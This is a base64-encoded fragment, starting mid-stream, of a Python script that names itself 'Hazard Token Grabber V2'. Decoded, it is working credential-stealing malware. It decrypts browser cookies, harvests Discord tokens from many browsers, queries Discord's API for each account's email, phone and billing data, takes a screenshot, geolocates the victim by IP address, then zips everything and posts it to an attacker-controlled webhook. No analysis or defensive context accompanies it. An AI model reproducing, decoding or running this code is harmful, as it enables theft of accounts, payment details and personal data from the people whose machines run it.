FQ1QgaG9zdF9rZXksIG5hbWUsIGVuY3J5cHRlZF92YWx1ZSBmcm9tIGNvb2tpZXMiKQogICAgICAgICAgICBmb3IgciBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIEhvc3QgPSByWzBdCiAgICAgICAgICAgICAgICB1c2VyID0gclsxXQogICAgICAgICAgICAgICAgZW5jcnlwdGVkX2Nvb2tpZSA9IHJbMl0KICAgICAgICAgICAgICAgIGRlY3J5cHRlZF9jb29raWUgPSBzZWxmLmRlY3J5cHRfcGFzc3dvcmQoZW5jcnlwdGVkX2Nvb2tpZSwgbWFzdGVyX2tleSkKICAgICAgICAgICAgICAgIGlmIEhvc3QgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmIkhvc3Q6IHtIb3N0fVxuVXNlcjoge3VzZXJ9XG5Db29raWU6IHtkZWNyeXB0ZWRfY29va2llfVxuXG4iKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgICAgIGYuY2xvc2UoKQogICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvcy5yZW1vdmUoIkxvZ2ludmF1bHQuZGIiKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKICAgIGRlZiBncmFiVG9rZW5zKHNlbGYpOgogICAgICAgIGYgPSBvcGVuKHNlbGYudGVtcGZvbGRlcisiXFxEaXNjb3JkIEluZm8udHh0IiwgInciLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgZi53cml0ZSgiTWFkZSBieSBSZGltbyB8IGh0dHBzOi8vZ2l0aHViLmNvbS9SZGltby9IYXphcmQtVG9rZW4tR3JhYmJlci1WMlxuXG4iKQogICAgICAgIHBhdGhzID0gewogICAgICAgICAgICAnRGlzY29yZCc6IHNlbGYucm9hbWluZyArIHInXFxkaXNjb3JkXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnRGlzY29yZCBDYW5hcnknOiBzZWxmLnJvYW1pbmcgKyByJ1xcZGlzY29yZGNhbmFyeVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0xpZ2h0Y29yZCc6IHNlbGYucm9hbWluZyArIHInXFxMaWdodGNvcmRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdEaXNjb3JkIFBUQic6IHNlbGYucm9hbWluZyArIHInXFxkaXNjb3JkcHRiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnT3BlcmEnOiBzZWxmLnJvYW1pbmcgKyByJ1xcT3BlcmEgU29mdHdhcmVcXE9wZXJhIFN0YWJsZVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ09wZXJhIEdYJzogc2VsZi5yb2FtaW5nICsgcidcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBHWCBTdGFibGVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdBbWlnbyc6IHNlbGYuYXBwZGF0YSArIHInXFxBbWlnb1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnVG9yY2gnOiBzZWxmLmFwcGRhdGEgKyByJ1xcVG9yY2hcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0tvbWV0YSc6IHNlbGYuYXBwZGF0YSArIHInXFxLb21ldGFcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ09yYml0dW0nOiBzZWxmLmFwcGRhdGEgKyByJ1xcT3JiaXR1bVxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2VudEJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyByJ1xcQ2VudEJyb3dzZXJcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJzdTdGFyJzogc2VsZi5hcHBkYXRhICsgcidcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnU3B1dG5payc6IHNlbGYuYXBwZGF0YSArIHInXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdWaXZhbGRpJzogc2VsZi5hcHBkYXRhICsgcidcXFZpdmFsZGlcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0Nocm9tZSBTeFMnOiBzZWxmLmFwcGRhdGEgKyByJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUnOiBzZWxmLmFwcGRhdGEgKyByJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0VwaWMgUHJpdmFjeSBCcm93c2VyJzogc2VsZi5hcHBkYXRhICsgcidcXEVwaWMgUHJpdmFjeSBCcm93c2VyXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdNaWNyb3NvZnQgRWRnZSc6IHNlbGYuYXBwZGF0YSArIHInXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YVxcRGVmYXVsXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnVXJhbic6IHNlbGYuYXBwZGF0YSArIHInXFx1Q296TWVkaWFcXFVyYW5cXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1lhbmRleCc6IHNlbGYuYXBwZGF0YSArIHInXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0JyYXZlJzogc2VsZi5hcHBkYXRhICsgcidcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0lyaWRpdW0nOiBzZWxmLmFwcGRhdGEgKyByJ1xcSXJpZGl1bVxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnCiAgICAgICAgfQoKICAgICAgICBmb3Igc291cmNlLCBwYXRoIGluIHBhdGhzLml0ZW1zKCk6CiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxlX25hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyN30iLCByIm1mYVwuW1x3LV17ODR9Iik6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBmaW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0b2tlbikKICAgICAgICBmb3IgdG9rZW4gaW4gc2VsZi50b2tlbnM6CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIsIGhlYWRlcnM9c2VsZi5nZXRoZWFkZXJzKHRva2VuKSkKICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICBpZiB0b2tlbiBpbiBzZWxmLnNhdmVkOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBzZWxmLnNhdmVkLmFwcGVuZCh0b2tlbikKICAgICAgICAgICAgICAgIGogPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIsIGhlYWRlcnM9c2VsZi5nZXRoZWFkZXJzKHRva2VuKSkuanNvbigpCiAgICAgICAgICAgICAgICBiYWRnZXMgPSAiIgogICAgICAgICAgICAgICAgZmxhZ3MgPSBqWydmbGFncyddCiAgICAgICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMSk6CiAgICAgICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJTdGFmZiwgIgogICAgICAgICAgICAgICAgaWYgKGZsYWdzID09IDIpOgogICAgICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiUGFydG5lciwgIgogICAgICAgICAgICAgICAgaWYgKGZsYWdzID09IDQpOgogICAgICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiSHlwZXNxdWFkIEV2ZW50LCAiCiAgICAgICAgICAgICAgICBpZiAoZmxhZ3MgPT0gOCk6CiAgICAgICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJHcmVlbiBCdWdodW50ZXIsICIKICAgICAgICAgICAgICAgIGlmIChmbGFncyA9PSA2NCk6CiAgICAgICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJIeXBlc3F1YWQgQnJhdmVyeSwgIgogICAgICAgICAgICAgICAgaWYgKGZsYWdzID09IDEyOCk6CiAgICAgICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJIeXBlU3F1YWQgQnJpbGxhbmNlLCAiCiAgICAgICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMjU2KToKICAgICAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkh5cGVTcXVhZCBCYWxhbmNlLCAiCiAgICAgICAgICAgICAgICBpZiAoZmxhZ3MgPT0gNTEyKToKICAgICAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkVhcmx5IFN1cHBvcnRlciwgIgogICAgICAgICAgICAgICAgaWYgKGZsYWdzID09IDE2Mzg0KToKICAgICAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkdvbGQgQnVnSHVudGVyLCAiCiAgICAgICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTMxMDcyKToKICAgICAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIlZlcmlmaWVkIEJvdCBEZXZlbG9wZXIsICIKICAgICAgICAgICAgICAgIGlmIChiYWRnZXMgPT0gIiIpOgogICAgICAgICAgICAgICAgICAgIGJhZGdlcyA9ICJOb25lIgoKICAgICAgICAgICAgICAgIHVzZXIgPSBqWyJ1c2VybmFtZSJdICsgIiMiICsgc3RyKGpbImRpc2NyaW1pbmF0b3IiXSkKICAgICAgICAgICAgICAgIGVtYWlsID0galsiZW1haWwiXQogICAgICAgICAgICAgICAgcGhvbmUgPSBqWyJwaG9uZSJdIGlmIGpbInBob25lIl0gZWxzZSAiTm8gUGhvbmUgTnVtYmVyIGF0dGFjaGVkIgoKICAgICAgICAgICAgICAgIHVybCA9IGYnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy97alsiaWQiXX0ve2pbImF2YXRhciJdfS5naWYnCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KHVybCkKICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICB1cmwgPSB1cmxbOi00XQoKICAgICAgICAgICAgICAgIG5pdHJvX2RhdGEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9iaWxsaW5nL3N1YnNjcmlwdGlvbnMnLCBoZWFkZXJzPXNlbGYuZ2V0aGVhZGVycyh0b2tlbikpLmpzb24oKQogICAgICAgICAgICAgICAgaGFzX25pdHJvID0gRmFsc2UKICAgICAgICAgICAgICAgIGhhc19uaXRybyA9IGJvb2wobGVuKG5pdHJvX2RhdGEpID4gMCkKCiAgICAgICAgICAgICAgICBiaWxsaW5nID0gYm9vbChsZW4oanNvbi5sb2FkcyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsIGhlYWRlcnM9c2VsZi5nZXRoZWFkZXJzKHRva2VuKSkudGV4dCkpID4gMCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZi53cml0ZShmInsnICcqMTd9e3VzZXJ9XG57Jy0nKjUwfVxuVG9rZW46IHt0b2tlbn1cbkhhcyBCaWxsaW5nOiB7YmlsbGluZ31cbk5pdHJvOiB7aGFzX25pdHJvfVxuQmFkZ2VzOiB7YmFkZ2VzfVxuRW1haWw6IHtlbWFpbH1cblBob25lOiB7cGhvbmV9XG5bQXZhdGFyXSh7dXJsfSlcblxuIikKICAgICAgICBmLmNsb3NlKCkKCiAgICBkZWYgc2NyZWVuc2hvdChzZWxmKToKICAgICAgICBpbWFnZSA9IHB5YXV0b2d1aS5zY3JlZW5zaG90KCkKICAgICAgICBpbWFnZS5zYXZlKHNlbGYudGVtcGZvbGRlciArICJcXFNjcmVlbnNob3QucG5nIikKCiAgICBkZWYgU2VuZEluZm8oc2VsZik6CiAgICAgICAgaXAgPSBjb3VudHJ5ID0gY2l0eSA9IHJlZ2lvbiA9IGdvb2dsZW1hcCA9ICJOb25lIgogICAgICAgIHRyeToKICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgiaHR0cDovL2lwaW5mby5pby9qc29uIikuanNvbigpCiAgICAgICAgICAgIGlwID0gZGF0YVsnaXAnXQogICAgICAgICAgICBjaXR5ID0gZGF0YVsnY2l0eSddCiAgICAgICAgICAgIGNvdW50cnkgPSBkYXRhWydjb3VudHJ5J10KICAgICAgICAgICAgcmVnaW9uID0gZGF0YVsncmVnaW9uJ10KICAgICAgICAgICAgZ29vZ2xlbWFwID0gImh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vbWFwcy9zZWFyY2gvZ29vZ2xlK21hcCsrIiArIGRhdGFbJ2xvYyddCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwogICAgICAgIHRlbXAgPSBvcy5wYXRoLmpvaW4oc2VsZi50ZW1wZm9sZGVyKQogICAgICAgIG5ldyA9IG9zLnBhdGguam9pbihzZWxmLmFwcGRhdGEsIGYnSGF6YXJkLlYyLVt7b3MuZ2V0bG9naW4oKX1dLnppcCcpCiAgICAgICAgc2VsZi56aXAodGVtcCwgbmV3KQogICAgICAgIGZvciBkaXJuYW1lLCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYudGVtcGZvbGRlcik6CiAgICAgICAgICAgIGZvciBmIGluIGZpbGVzOgogICAgICAgICAgICAgICAgc2VsZi5maWxlcyArPSBmIlxue2Z9IgogICAgICAgIG4gPSAwCiAgICAgICAgZm9yIHIsIGQsIGZpbGVzIGluIG9zLndhbGsoc2VsZi50ZW1wZm9sZGVyKToKICAgICAgICAgICAgbis9IGxlbihmaWxlcykKICAgICAgICAgICAgc2VsZi5maWxlQ291bnQgPSBmIntufSBGaWxlcyBGb3VuZDogIgogICAgICAgIGVtYmVkID0gewogICAgICAgICAgICAiYXZhdGFyX3VybCI6Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzgyODA0Nzc5MzYxOTg2MTU1Ny84OTE1MzcyNTUwNzg5ODU4MTkvbmVkbGFkZG5pbmdfOS5naWYiLAogICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIkhhemFyZCBUb2tlbiBHcmFiYmVyLlYyIiwKICAgICAgICAgICAgICAgICAgICAgICAgInVybCI6ICJodHRwczovL2dpdGh1Yi5jb20vUmRpbW8vSGF6YXJkLVRva2VuLUdyYWJiZXItVjIiLAogICAgICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvODI4MDQ3NzkzNjE5ODYxNTU3Lzg5MTY5ODE5MzI0NTU2MDg2Mi9IYXphcmQuZ2lmIgogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiIqKntvcy5nZXRsb2dpbigpfSoqIEp1c3QgcmFuIEhhemFyZCBUb2tlbiBHcmFiYmVyLlYyXG5gYGBmaXhcbkNvbXB1dGVyTmFtZToge29zLmdldGVudignQ09NUFVURVJOQU1FJyl9XG5JUDoge2lwfVxuQ2l0eToge2NpdHl9XG5SZWdpb246IHtyZWdpb259XG5Db3VudHJ5OiB7Y291bnRyeX1gYGBbR29vZ2xlIE1hcHMgTG9jYXRpb25dKHtnb29nbGVtYXB9KVxuYGBgZml4XG57c2VsZi5maWxlQ291bnR9e3NlbGYuZmlsZXN9YGBgIiwKICAgICAgICAgICAgICAgICAgICAiY29sb3IiOiAxNjExOTEwMSwKCiAgICAgICAgICAgICAgICAgICAgInRodW1ibmFpbCI6IHsKICAgICAgICAgICAgICAgICAgICAgICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JkaW1vL2ltYWdlcy9tYXN0ZXIvSGF6YXJkLVRva2VuLUdyYWJiZXItVjIvSGF6YXJkLmdpZiIKICAgICAgICAgICAgICAgICAgICB9LCAgICAgICAKCiAgICAgICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogImsiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdCiAgICAgICAgfQogICAgICAgIHJlcXVlc3RzLnBvc3Qoc2VsZi53ZWJob29rLCBqc29uPWVtYmVkKQogICAgICAgIHJlcXVlc3RzLnBvc3Qoc2VsZi53ZWJob29rLCBmaWxlcz17J3VwbG9hZF9maWxlJzogb3BlbihuZXcsJ3JiJyl9KQoKICAgIGRlZiB6aXAoc2VsZiwgc3JjLCBkc3QpOgogICAgICAgIHppcHBlZF9maWxlID0gemlwZmlsZS5aaXBGaWxlKGRzdCwgInciLCB6aXBmaWxlLlpJUF9ERUZMQVRFRCkKICAgICAgICBhYnNfc3JjID0gb3MucGF0aC5hYnNwYXRoKHNyYykKICAgICAgICBmb3IgZGlybmFtZSwgXywgZmlsZXMgaW4gb3Mud2FsayhzcmMpOgogICAgICAgICAgICBmb3IgZmlsZW5hbWUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICBhYnNuYW1lID0gb3MucGF0aC5hYnNwYXRoKG9zLnBhdGguam9pbihkaXJuYW1lLCBmaWxlbmFtZSkpCiAgICAgICAgICAgICAgICBhcmNuYW1lID0gYWJzbmFtZVtsZW4oYWJzX3NyYykgKyAxOl0KICAgICAgICAgICAgICAgIHppcHBlZF9maWxlLndyaXRlKGFic25hbWUsIGFyY25hbWUpCiAgICAgICAgemlwcGVkX2ZpbGUuY2xvc2UoKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIEhhemFyZF9Ub2tlbl9HcmFiYmVyX1YyKCk=
